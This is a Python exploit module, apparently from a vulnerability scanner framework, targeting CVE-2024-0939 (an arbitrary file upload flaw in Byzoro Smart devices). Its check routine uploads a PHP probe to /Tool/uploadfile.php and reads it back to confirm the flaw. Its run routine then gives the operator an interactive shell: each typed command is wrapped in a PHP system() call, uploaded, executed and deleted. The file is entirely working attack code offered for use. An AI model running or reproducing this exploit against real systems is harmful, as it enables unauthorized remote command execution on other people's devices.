#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
from urllib.parse import urljoin

urllib3.disable_warnings()

class Cve_2024_0939:

    def check(self,url):
        url = url.rstrip("/")
        target_url = urljoin(url, "/Tool/uploadfile.php?")
        headers = {
            "User-Agent": self.headers["User-Agent"],
            "Content-Type": "multipart/form-data; boundary=---------------------------98765432109876543210987654321"
        }
        data = """-----------------------------98765432109876543210987654321\r\nContent-Disposition: form-data; name="file_upload"; filename="test.php"\r\nContent-Type: application/octet-stream\r\n\r\n<?php print(md5("HelloworldHelloworld"));unlink(__FILE__);?>\r\n-----------------------------98765432109876543210987654321\r\nContent-Disposition: form-data; name="txt_path"\r\n\r\n/home/test.php\r\n-----------------------------98765432109876543210987654321--"""
        try:
            response = requests.post(target_url, verify=self.ssl,proxies=self.proxy, headers=headers, data=data, timeout=15)
            if response.status_code == 200 and 'multipart/form-data' in response.text:
                result_url = urljoin(url, '/home/test.php')
                result_response = requests.get(result_url, headers=headers, verify=False, timeout=15)
                if result_response.status_code == 200 and 'cdcd28e0ca8a05f2c54c3b5755cb8c3f' in result_response.text:
                    OutPrintInfoSuc("Byzoro", f'目标存在CVE-2024-0939任意文件上传漏洞: {url}')
                    if self.batch:
                        OutPutFile("byzoro_smart_2024_0939.txt", f'目标存在CVE-2024-0939任意文件上传漏洞: {url}')
                    return True
                else:
                    if not self.batch:
                        OutPrintInfo("Byzoro", f'目标不存在CVE-2024-0939任意文件上传漏洞')
            else:
                if not self.batch:
                    OutPrintInfo("Byzoro", f'目标不存在CVE-2024-0939任意文件上传漏洞')
        except Exception as e:
            if not self.batch:
                OutPrintInfo("Byzoro", f'目标请求出错')

    def run(self,url):
        url = url.rstrip("/")
        target_url = urljoin(url, "/Tool/uploadfile.php?")
        headers = {
            "User-Agent": self.headers["User-Agent"],
            "Content-Type": "multipart/form-data; boundary=---------------------------98765432109876543210987654321"
        }
        if self.check(url):
            while True:
                command = input("\033[34mPlease input command (stop input:exit):\033[0m")
                if "exit" not in command:
                    data = """-----------------------------98765432109876543210987654321\r\nContent-Disposition: form-data; name="file_upload"; filename="test.php"\r\nContent-Type: application/octet-stream\r\n\r\n<?php system('{}');unlink(__FILE__);?>\r\n-----------------------------98765432109876543210987654321\r\nContent-Disposition: form-data; name="txt_path"\r\n\r\n/home/test.php\r\n-----------------------------98765432109876543210987654321--""".format(
                        command)
                    try:
                        response = requests.post(target_url, verify=self.ssl,proxies=self.proxy, headers=headers, data=data, timeout=15)
                        if response.status_code == 200 and 'multipart/form-data' in response.text:
                            result_url = urljoin(url, '/home/test.php')
                            result_response = requests.get(result_url, headers=headers, verify=self.ssl,proxies=self.proxy, timeout=15)
                            if result_response.status_code == 200:
                                OutPrintInfoSuc("Byzoro",f"响应:\n{result_response.text.strip()}")
                    except Exception as e:
                        OutPrintInfo("Byzoro", f'目标请求出错')
                        pass
                else:

                    break

    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Byzoro", '开始检测CVE-2024-0939任意文件上传漏洞...')
        if self.check(url):
            if not self.batch:
                self.run(url)
        if not self.batch:
            OutPrintInfo("Byzoro", 'CVE-2024-0939任意文件上传漏洞检测结束')

